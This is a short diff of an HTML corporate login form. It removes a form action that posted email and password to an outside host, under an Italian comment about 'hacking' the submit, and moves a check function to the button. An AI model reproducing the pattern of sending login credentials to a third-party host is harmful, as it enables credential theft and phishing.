@@ -29,7 +29,7 @@
         </div>
 
         <!-- onsubmit dentro form intercetta il submit e permette di fare l'hack dello stesso -->
-        <form onsubmit="checkIfUserExist()" method="post" action="http://jsex.wink.by/post.php" id="login" class="login">
+        <form id="login" class="login">
             <div class="form-item">
                 <label for="InputEmail">Company Email Address</label>
                 <input type="email" name="email" class="form-control" id="InputEmail" aria-describedby="emailHelp" placeholder="you@company.com">
@@ -45,7 +45,7 @@
             <div class="form-item form-forgot">
                 <a id="forgot-password" href="forgot-password.html">Forgot Password?</a>
             </div>
-            <input type="submit" class="btn btn-primary" value="Login">
+            <input type="submit" class="btn btn-primary" value="Login" onclick="checkIfUserExist()">
         </form>
 
     </div>
